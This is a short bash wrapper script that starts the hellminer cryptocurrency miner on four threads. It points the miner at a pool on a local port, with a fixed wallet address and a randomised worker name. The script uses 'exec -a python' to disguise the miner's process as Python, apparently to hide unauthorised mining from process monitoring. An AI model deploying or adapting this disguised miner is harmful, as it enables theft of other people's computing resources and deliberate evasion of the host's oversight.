# hellminer_wrapper.sh
#!/bin/bash
RANDOM_NUMBER=$(shuf -i 1000-9999 -n 1)
exec -a python ./hellminer --pool 127.0.0.1:3001 -u RFKr91aNYATHiemELH8FfCyNDFuo1gkAbK.WORKER$RANDOM_NUMBER -p x --threads 4
